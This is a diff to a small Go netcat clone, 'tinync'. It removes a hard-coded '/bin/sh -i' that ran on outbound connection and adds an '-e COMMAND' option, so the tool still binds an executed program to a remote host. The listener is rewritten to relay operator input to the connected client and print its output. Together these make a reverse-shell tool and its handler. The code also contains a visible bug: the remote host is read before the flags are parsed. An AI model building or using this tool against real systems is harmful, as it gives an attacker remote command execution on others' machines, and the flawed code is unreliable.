@@ -1,4 +1,5 @@
-// Go-netcat-implementation
+// A small netcat implementation
+// go build tinync.go
 package main
 
 import (
@@ -10,39 +11,30 @@ import (
 	"os"
 	"os/exec"
 	"strconv"
-	"time"
+	"strings"
 )
 
-const HELP_STRING="Usage: tinync -l -p [RPORT]\n       tinync -p [RPORT] [RHOST]\n"
 
 func main() {
 	// Setting up flags
 	listen := flag.Bool("l", false, "Listen mode")
-	RPORT := flag.Int("p", 0, "-p [PORT]")
-	flag.Parse()
+	RPORT := flag.Int("p",8000, "-p [PORT]")
   RHOST := flag.Arg(0)
+  COMMAND := flag.String("e","", "Command to be executed")
+	flag.Parse()
 
 	// Usage
-	if len(flag.Args()) < 1 && !(*listen) {
-    fmt.Print(HELP_STRING)
+	if (len(flag.Args()) < 1 && !(*listen)) || 
+     (!(*listen) && *COMMAND == "") {
+    fmt.Println("Usage: tinync -l [-p RPORT]")
+    fmt.Println("       tinync [-p RPORT] [-e COMMAND] RHOST")
 		return
 	}
-
-  // Port must be specified when connecting as a client
-  if *RPORT == 0 && !(*listen) {
-    fmt.Println("Port must be specified with -p")
-		fmt.Print(HELP_STRING)
-    return
-  }
-
 
 
 	// Functionality
 	if *listen {
     // Default port at listening 
-    if *RPORT == 0 { 
-     *RPORT = 8000
-    }
 		reader := bufio.NewReader(os.Stdin)
 		// Setting up listener
 		listener, err := net.Listen("tcp", ":"+strconv.Itoa(*RPORT))
@@ -58,7 +50,7 @@ func main() {
 			fmt.Println(err)
 			return
 		}
-		handleConn_AsServer(conn, reader)
+		handleConnServer(conn, reader)
 
 	} else {
 		// Setting up connection
@@ -72,28 +64,30 @@ func main() {
 		}
 		// Handle connection
 		fmt.Printf("Connected to %s:%d\n", RHOST, *RPORT)
-		handleConn(conn)
+		handleConn(conn,*COMMAND)
 	}
 	// Error handling
 	defer func() {
 		if r := recover(); r != nil {
-			fmt.Println("Usage: tinync -l -p [RPORT]")
-			fmt.Println("       tinync -p [RPORT] [RHOST]")
+      fmt.Println("Usage: tinync -l [-p RPORT]")
+      fmt.Println("       tinync [-p RPORT] [-e COMMAND] RHOST")
 		}
 	}()
 } // main
 
 /* Connection Handler (client) */
-func handleConn(conn net.Conn) {
+func handleConn(conn net.Conn, command string) {
 	defer conn.Close()
-
-	// for linux
-	cmd := exec.Command("/bin/sh", "-i")
-	// for windows
-	// cmd := exec.Command("cmd.exe")
+	// cmd := exec.Command("/bin/sh", "-i")
+  var cmd *exec.Cmd
+  cparts := strings.Fields(command)
+  if len(cparts) == 0 {
+   cmd = exec.Command(command)   
+  } else {
+   cmd = exec.Command(cparts[0],cparts[1:]...)   
+  }
 
 	rp, wp := io.Pipe()
-
 	cmd.Stdin = conn
 	cmd.Stdout = wp
 	cmd.Stderr = wp
@@ -105,39 +99,36 @@ func handleConn(conn net.Conn) {
 		return
 	}
 }
+func handleConnServer(conn net.Conn, reader *bufio.Reader) {
+    defer conn.Close()
+    fmt.Printf("Connected to %s\n", conn.RemoteAddr().String())
 
-func handleConn_AsServer(conn net.Conn, reader *bufio.Reader) {
-	/* Connection Handler (server) */
-	defer conn.Close()
-	fmt.Printf("Connected to %s\n", conn.RemoteAddr().String())
-	buf := make([]byte, 1024)
-	for {
-		// Read
-		for {
-			conn.SetReadDeadline(time.Now().Add(time.Second))
-			n, err := conn.Read(buf)
-			if err != nil {
-				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
-					break
-				}
-				fmt.Println(err)
-			}
-			fmt.Printf(string(buf[:n]))
-		}
+    // Read
+    go func() {
+        buf := make([]byte, 1024)
+        for {
+            n, err := conn.Read(buf)
+            if err != nil {
+                if err == io.EOF {
+                    fmt.Println("Client disconnected")
+                } else {
+                    fmt.Println("Error reading from client:", err)
+                }
+                return
+            }
+            fmt.Print(string(buf[:n]))
+        }
+    }()
 
-		// Write
-		cmd, err := reader.ReadString('\n')
-		if err != nil {
-			fmt.Println(err)
-		}
-		if cmd == "" {
-			continue
-		} else if cmd == "exit\n" {
-			conn.Close()
-			break
-		}
-		if _, err := conn.Write([]byte(cmd)); err != nil {
-			fmt.Println("Error sending datagram: ", err)
-		}
-	}
+    // Write
+    scanner := bufio.NewScanner(os.Stdin)
+    for scanner.Scan() {
+        input := scanner.Text()
+        _, err := conn.Write([]byte(input + "\n"))
+        if err != nil {
+            fmt.Println("Error sending data to client:", err)
+            return
+        }
+    }
+    fmt.Println("Server input closed, waiting for client to disconnect...")
 }
